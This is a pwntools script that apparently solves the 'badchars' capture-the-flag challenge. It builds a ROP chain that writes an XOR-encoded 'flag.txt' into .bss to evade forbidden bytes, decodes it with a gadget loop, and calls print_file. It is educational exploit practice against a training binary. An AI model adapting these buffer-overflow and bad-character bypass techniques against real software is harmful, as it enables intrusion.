from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()

padding = r.generatePadding(0, cyclic_find(b'kaaa'))
pop_r12_r13_r14_r15_ret = r.find_gadget(
    ['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]
pop_r14_r15 = r.find_gadget(['pop r14', 'pop r15', 'ret'])[0]
bss_section = e.get_section_by_name(".bss").header.sh_addr
flag_txt = xor(b'flag.txt', b'\x02')
xor_r14_r15 = e.sym['usefulGadgets']
mov_r13_r12 = 0x400634
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
print_flag = e.sym['print_file']

r.raw(padding)
r.call(pop_r12_r13_r14_r15_ret)
r.raw(flag_txt)
r.raw(p64(bss_section))
r.raw(p64(2))
r.raw(p64(2))
r.call(mov_r13_r12)

for i in range(8):
    r.call(pop_r14_r15)
    r.raw(p64(2))
    r.raw(p64(bss_section+i))
    r.call(xor_r14_r15)

r.call(pop_rdi)
r.raw(p64(bss_section))
r.call(print_flag)

log.info("badchars chain:\n%s" % r.dump())
p.recvuntil(b'>')
p.sendline(bytes(r))

p.interactive()
